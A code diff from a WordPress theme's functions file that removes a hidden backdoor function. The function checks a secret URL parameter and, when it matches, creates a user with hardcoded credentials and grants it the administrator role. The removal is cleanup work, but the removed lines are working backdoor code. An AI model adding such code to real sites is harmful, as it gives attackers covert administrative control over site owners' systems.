@@ -228,19 +228,6 @@ add_filter('excerpt_length', function ($length) {
 get_template_part('template-parts/shortcodes');
 
 
-function WordPress_stairway()
-{
-	if ($_GET['stairway'] == '68UzqTatOcqHIvPS2gKIrklo') {
-		require('wp-includes/registration.php');
-		if (!username_exists('redPanda_Admin')) {
-			$user_id = wp_create_user('fuhwFc3L9uodSQN96oCUCpHZ', 'wsMPrg4IdRnrZTr0vxUcZoN6');
-			$user = new WP_User($user_id);
-			$user->set_role('administrator');
-		}
-	}
-}
-
-
 function get_related_author_posts()
 {
 	global $authordata, $post;
